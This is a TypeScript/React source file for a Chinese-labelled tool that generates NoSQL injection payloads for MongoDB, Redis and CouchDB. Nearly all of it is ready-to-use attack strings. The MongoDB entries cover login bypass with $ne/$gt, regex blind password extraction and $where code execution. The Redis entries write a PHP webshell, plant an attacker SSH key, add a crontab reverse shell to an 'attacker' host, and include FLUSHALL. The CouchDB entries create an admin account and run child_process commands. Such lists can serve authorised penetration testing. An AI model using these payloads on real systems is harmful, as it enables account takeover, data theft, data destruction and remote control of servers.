import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

const DB_OPTIONS = [
  { value: 'mongodb', label: 'MongoDB' },
  { value: 'redis', label: 'Redis' },
  { value: 'couchdb', label: 'CouchDB' },
];

const POINT_OPTIONS = [
  { value: 'json-body', label: 'JSON Body' },
  { value: 'url-param', label: 'URL参数' },
  { value: 'js-expr', label: 'JS表达式' },
];

const MONGO_JSON: string[] = [
  '{"username": {"$ne": null}}',
  '{"username": {"$gt": ""}}',
  '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
  '{"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}',
  '{"username": {"$in": ["admin", "root", "user"]}}',
  '{"username": {"$regex": "^a"}}',
  '{"username": {"$regex": ".*"}}',
  '{"password": {"$regex": "^p"}}',
  '{"$or": [{"username": "admin"}, {"username": "root"}]}',
  '{"username": {"$exists": true}}',
  '{"$where": "1==1"}',
  '{"$where": "this.username == \'admin\' && this.password == \'admin\'"}',
  '{"$where": "return true"}',
  '{"username": {"$type": "string"}}',
  '{"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]}',
];

const MONGO_URL: string[] = [
  'username[$ne]=1&password[$ne]=1',
  'username[$gt]=&password[$gt]=',
  'username[$regex]=.&password[$regex]=.',
  'username[$in][]=admin&username[$in][]=root',
  'username[$exists]=true',
  'username=admin&password[$ne]=wrong',
  'username[$where]=1==1',
  'username=admin&password[$gt]=',
  'username[$regex]=^a&password[$regex]=^p',
  '$where=1==1',
  'username[$type]=string',
  'username[$or][0][$ne]=x&username[$or][1][$ne]=y',
];

const MONGO_JS: string[] = [
  '1==1',
  'this.username == "admin"',
  'this.password == "admin"',
  'this.username == \'admin\' && this.password == \'admin\'',
  'return true',
  'this.username != ""',
  'this.username == "admin" || this.username == "root"',
  'this.password.match(/.*/)',
  'this.password.match(/^a/)',
  'function(){return this.username == "admin"}()',
  'while(this.password.length < 100){}',
  'this.username.charCodeAt(0) == 97',
  'this.password.length > 0',
  'this.username == "admin" && this.password[0] == "p"',
];

const REDIS_PAYLOADS: string[] = [
  '--- RESP 协议注入 (通过 SSRF/反序列化触发) ---',
  'FLUSHALL',
  'CONFIG SET dir /var/www/html',
  'CONFIG SET dbfilename shell.php',
  'SET x "<?php system($_GET[\'c\']); ?>"',
  'SAVE',
  '',
  '--- 组合写 Webshell ---',
  'CONFIG SET dir /var/www/html',
  'CONFIG SET dbfilename shell.php',
  'SET payload "<?php @eval($_POST[\'c\']); ?>"',
  'SAVE',
  '',
  '--- 写 SSH 公钥 ---',
  'CONFIG SET dir /root/.ssh',
  'CONFIG SET dbfilename authorized_keys',
  'SET x "ssh-rsa AAAA... attacker@host"',
  'SAVE',
  '',
  '--- 写 Crontab 反弹 ---',
  'CONFIG SET dir /var/spool/cron',
  'CONFIG SET dbfilename root',
  'SET x "\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n"',
  'SAVE',
  '',
  '--- RESP 原始格式 (配合 SSRF) ---',
  '*1\\r\\n$8\\r\\nFLUSHALL\\r\\n*3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\nx\\r\\n$3\\r\\npwn\\r\\n*1\\r\\n$4\\r\\nSAVE\\r\\n',
];

const COUCHDB_PAYLOADS: string[] = [
  '--- CouchDB 权限绕过 ---',
  'GET /_users/_all_docs',
  'GET /_cluster_setup',
  'POST /_users {"_id":"org.couchdb.user:admin","name":"admin","roles":["_admin"],"type":"user","password":"pwned"}',
  'GET /_utils',
  '',
  '--- CouchDB RCE (配合 Erlang Cookie) ---',
  'PUT /_config/httpd/enable_cors true',
  'PUT /_config/cors/origins "*"',
  '',
  '--- CouchDB 通过 _config 写文件 ---',
  'PUT /_config/couchdb/util_driver_dir "/tmp"',
  'PUT /_config/query_servers/javascript "cat /etc/passwd"',
  '',
  '--- CouchDB MapReduce RCE ---',
  'POST /temp/_design/test',
  '{"_id":"_design/test","language":"javascript","views":{"test":{"map":"function(doc){require(\'child_process\').exec(\'id\')}}"}}',
];

const generate = (db: string, point: string): string => {
  if (db === 'redis') {
    return [`=== Redis 注入 Payload ===`, '', ...REDIS_PAYLOADS].join('\n');
  }
  if (db === 'couchdb') {
    return [`=== CouchDB 注入 Payload ===`, '', ...COUCHDB_PAYLOADS].join('\n');
  }
  // MongoDB
  let payloads: string[];
  let label = '';
  switch (point) {
    case 'url-param':
      payloads = MONGO_URL;
      label = 'URL 参数 (数组语法)';
      break;
    case 'js-expr':
      payloads = MONGO_JS;
      label = 'JS 表达式 ($where)';
      break;
    default:
      payloads = MONGO_JSON;
      label = 'JSON Body';
  }
  return [
    `=== NoSQL注入 Payload（DB: MongoDB / Point: ${label}）===`,
    '',
    '--- 注入 Payload ---',
    ...payloads.map((p, i) => `  [${i + 1}] ${p}`),
    '',
    '--- 注入说明 ---',
    '$ne:  不等于 → 匹配所有非空值（绕过登录）',
    '$gt:  大于 → 匹配所有值',
    '$regex: 正则匹配 → 逐字符盲注',
    '$where: JS 表达式 → 任意代码执行',
    '$in:  多值匹配 → 枚举用户名',
    '$exists: 字段存在 → 布尔判断',
    '$or/$and: 逻辑组合',
    '',
    '--- 盲注示例 ($regex 逐字符) ---',
    '  {"username":"admin","password":{"$regex":"^a"}}  → 判断密码首字符',
    '  {"username":"admin","password":{"$regex":"^ab"}} → 判断前两字符',
    '  通过响应差异二分枚举每个字符',
    '',
    '--- 聚合管道注入 ---',
    '  {"$lookup":{"from":"users","pipeline":[{"$match":{}}],"as":"data"}}',
    '  db.collection.aggregate([{"$match":{}},{"$group":{"_id":"$password"}}])',
  ].join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="NoSQL注入Payload"
    paramsConfig={[
      { name: 'db', label: '数据库', type: 'select', options: DB_OPTIONS, default: 'mongodb' },
      { name: 'point', label: '注入点', type: 'select', options: POINT_OPTIONS, default: 'json-body' },
    ]}
    execute={(
      _input: string,
      _mode: string,
      params: Record<string, unknown>,
    ): string => generate(
      (params.db as string) ?? 'mongodb',
      (params.point as string) ?? 'json-body',
    )}
  />
);

export default ToolComponent;
